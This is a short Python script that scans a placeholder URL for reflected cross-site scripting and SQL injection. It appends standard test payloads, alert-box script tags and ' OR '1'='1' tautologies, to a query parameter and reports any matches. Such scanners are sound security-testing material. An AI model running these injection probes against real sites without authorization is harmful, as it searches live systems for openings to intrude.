import requests

def scan_xss(url):
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    for payload in xss_payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")

def scan_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- "]
    for payload in sql_payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "SQL syntax" in response.text or "mysql" in response.text:
            print(f"SQL Injection vulnerability found with payload: {payload}")

target_url = "http://example.com/vulnerable_page.php?id="
scan_xss(target_url)
scan_sql_injection(target_url)
